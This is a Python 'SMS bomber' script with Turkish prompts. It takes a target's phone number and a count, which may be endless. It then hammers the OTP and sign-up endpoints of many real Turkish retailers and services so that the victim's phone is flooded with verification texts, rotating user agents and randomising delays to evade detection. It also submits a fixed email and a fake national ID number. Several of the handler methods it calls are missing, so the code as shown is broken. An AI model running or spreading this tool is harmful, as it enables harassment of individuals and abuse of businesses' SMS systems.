import asyncio
import aiohttp
import random
import sys

if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())


class SMS:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15"
        ]
        self.phone = ""
        self.mail = "xenz@gmail.com" 
        self.tc = "18378370000"  

    async def attack(self, phone_number, amount):
        self.phone = phone_number
        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(amount if amount > 0 else 10**6):
                tasks.extend([
                    self.send_kahve(session),
                    self.send_englishhome(session),
                    self.send_yapp(session),
                    self.send_yilmazticaret(session),
                    self.send_dominos(session),
                    self.send_pidem(session),
                    self.send_frink(session),
                    self.send_bodrum(session),
                    self.send_ido(session),
                    self.send_jimmykey(session),
                    self.send_alixavien(session),
                    self.send_metro(session),
                    self.send_hizliecza(session),
                    self.send_hayatsu(session),
                    self.send_koton(session)
                ])
                
                if len(tasks) >= 20:
                    await asyncio.gather(*tasks)
                    tasks = []
                    await asyncio.sleep(random.uniform(0.5, 1.5))

            if tasks:
                await asyncio.gather(*tasks)

    async def send_request(self, session, url, data, headers):
        try:
            headers["User-Agent"] = random.choice(self.user_agents)
            
            async with session.post(
                url,
                data=data,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                return response.status
        except Exception as e:
            return str(e)

    async def send_kahve(self, session):
        url = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
        data = {"countryCode": "90", "phoneNumber": self.phone}
        headers = {"Content-Type": "application/json"}
        status = await self.send_request(session, url, data, headers)
        print(f"[Kahve] Durum: {status}")

    async def send_englishhome(self, session):
        url = "https://www.englishhome.com/api/member/sendOtp"
        data = {"Phone": f"90{self.phone}", "XID": ""}
        headers = {"Content-Type": "application/json"}
        status = await self.send_request(session, url, data, headers)
        print(f"[EnglishHome] Durum: {status}")

    async def send_ido(self, session):
        url = "https://api.ido.com.tr/idows/v2/register"
        headers = {
            "Content-Type": "application/json",
            "Referer": "https://www.ido.com.tr/"
        }
        data = {
            "mobileNumber": f"0{self.phone}",
            "email": self.mail,
            "tckn": self.tc
        }
        status = await self.send_request(session, url, data, headers)
        print(f"[IDO] Durum: {status}")

    async def send_jimmykey(self, session):
        url = f"https://www.jimmykey.com/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined"
        headers = {"Content-Type": "application/json"}
        status = await self.send_request(session, url, None, headers)
        print(f"[JimmyKey] Durum: {status}")

    async def send_alixavien(self, session):
        url = "https://www.alixavien.com.tr/api/member/sendOtp"
        data = {"Phone": self.phone, "XID": ""}
        headers = {"Content-Type": "application/json"}
        status = await self.send_request(session, url, data, headers)
        print(f"[Alixavien] Durum: {status}")

    async def send_metro(self, session):
        url = "https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend"
        data = {"methodType": "2", "mobilePhoneNumber": self.phone}
        headers = {"Content-Type": "application/json"}
        status = await self.send_request(session, url, data, headers)
        print(f"[Metro] Durum: {status}")

    async def send_hizliecza(self, session):
        url = "https://prod.hizliecza.net/mobil/account/sendOTP"
        data = {"phoneNumber": f"+90{self.phone}"}
        headers = {"Content-Type": "application/json"}
        status = await self.send_request(session, url, data, headers)
        print(f"[Hizliecza] Durum: {status}")

    async def send_hayatsu(self, session):
        url = "https://api.hayatsu.com.tr/api/SignUp/SendOtp"
        data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        status = await self.send_request(session, url, data, headers)
        print(f"[Hayatsu] Durum: {status}")

    async def send_koton(self, session):
        url = "https://www.koton.com/users/register/"
        headers = {"Content-Type": "multipart/form-data"}
        data = aiohttp.FormData()
        data.add_field("phone", f"0{self.phone}")
        data.add_field("email", self.mail)
        status = await self.send_request(session, url, data, headers)
        print(f"[Koton] Durum: {status}Made by xenz or mystic-poop on github")

if __name__ == "__main__":
    bomber = SMS()
    print("""
***********************
*     X_X             *
* Made by Mystic-poop *
*         Or          *
*       Xenz          *
***********************
    """)
    phone = input("Hedefin telefon numarası (+90 olmadan): ").strip()
    count = int(input("Gönderilecek sms sayısı (0=sonsuz): "))
    
    try:
        asyncio.run(bomber.attack(phone, count))
    except KeyboardInterrupt:
        print("\nSaldırı durduruldu!!!!1!")
